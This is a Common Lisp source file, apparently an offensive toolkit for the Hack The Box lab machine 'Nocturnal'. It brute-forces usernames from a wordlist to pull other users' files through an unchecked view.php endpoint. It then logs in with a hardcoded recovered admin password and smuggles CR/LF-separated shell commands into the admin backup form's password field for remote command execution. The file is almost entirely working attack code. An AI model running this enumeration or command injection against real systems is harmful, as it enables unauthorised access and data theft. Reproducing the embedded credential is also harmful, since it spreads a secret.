(in-package :grimoire)

(defvar *nocturnal/host* "http://nocturnal.htb/")
(defvar *nocturnal/cookies* (cookie:make-cookie-jar))

(defparameter *nocturnal/user-names* 
  "/home/solanav/documents/seclists/Usernames/Names/names.txt")

;; recovered through a normal user, check privacy.odt in user amanda
(defvar *nocturnal/admin-username* "amanda")
(defvar *nocturnal/admin-password* "arHkG7HAI68X8s1J")

(s:defalias nocturnal/path (s:partial #'s:concat *nocturnal/host*))

(defun nocturnal/register (username password)
  (dex:post (nocturnal/path "register.php")
            :content `(("username" . ,username)
                       ("password" . ,password))))

(defun nocturnal/login (username password)
  (dex:post (nocturnal/path "login.php")
            :cookie-jar *nocturnal/cookies*
            :content `(("username" . ,username)
                       ("password" . ,password))))

(defun nocturnal/upload (file)
  "upload a file"
  (dex:post (nocturnal/path "dashboard.php")
            :cookie-jar *nocturnal/cookies*
            :content `(("fileToUpload" . ,file))))

(defun nocturnal/file (username filename output-path)
  "download a file"
  (let ((uri (quri:make-uri
              :defaults *nocturnal/host*
              :path "/view.php"
              :query `(("username" . ,username)
                       ("file" . ,filename)))))
    (with-open-file (s (merge-pathnames filename output-path)
                       :direction :output
                       :if-exists :overwrite
                       :if-does-not-exist :create
                       :element-type '(unsigned-byte 8))
      (a:copy-stream (dex:get uri :cookie-jar *nocturnal/cookies* :want-stream t)
                     s))))

(defun nocturnal/user-files (username)
  "return the list of files of a given user"
  (let ((html (s:~> (quri:make-uri
                     :defaults *nocturnal/host*
                     :path "/view.php"
                     :query `(("username" . ,username)
                              ("file" . "non-existant-pdf-file.pdf")))
                    (dex:get :cookie-jar *nocturnal/cookies*)))
        (results nil))
    
    (cl-ppcre:do-register-groups (file) 
        ((fmt "view.php\\?username=~a&file=(.*?)\\\"" username) html)
      (push (cons username file) results)
      (out "[+] File found in user \"~a\": ~a~%" username file))
    
    results))
  
(defun nocturnal/test (path)
  (dex:get (nocturnal/path path)
           :cookie-jar *nocturnal/cookies*))

(defun nocturnal/brute-force ()
  "check all usernames to see if anyone has cool files"
  (let ((lparallel:*kernel* (lparallel:make-kernel 48)))
    (s:~>> (a:read-file-into-string *nocturnal/user-names*)
           (str:lines)
           (lparallel:pmapcan #'nocturnal/user-files)
           (remove-if #'null))))

(defun nocturnal/init ()
  "register with a new user and save the cookie"
  (let ((username (random-string 16))
        (password (random-string 16)))
    (nocturnal/register username password)
    (nocturnal/login username password)
    (values username password)))

(defun spaces-to-tabs (string)
  (coerce 
   (loop for c across string
         if (char= c #\Space) collect #\Tab
         else collect c)
   'string))

(define-glyph :command nocturnal/exploit (command)
  (nocturnal/init)
  
  (let* ((payload-name "payload.pdf")
         (payload-path (merge-pathnames payload-name "/tmp/")))
    
    ;; write the payload
    (a:write-string-into-file 
     "/etc/passwd" payload-path
     :if-exists :overwrite)
    
    ;; upload the payload
    (nocturnal/upload payload-path)
    
    ;; try to read as a backup
    (let* ((clean-command (spaces-to-tabs command))
           (injection (fmt "pass\\\"~a~a~a~a#" 
                           #\Return #\Newline clean-command #\Tab)))
      
      (nocturnal/login *nocturnal/admin-username* *nocturnal/admin-password*)
      
      (let ((res (dex:post (nocturnal/path "admin.php")
                           :headers '(("content-type" . "application/x-www-form-urlencoded"))
                           :content `(("password" . ,injection)
                                      ("backup" . ""))
                           :cookie-jar *nocturnal/cookies*)))
        (s:~>> res 
               (str:split "nothing to select from)") (cadr)
               (str:split "</pre>") (car)
               (str:trim))))))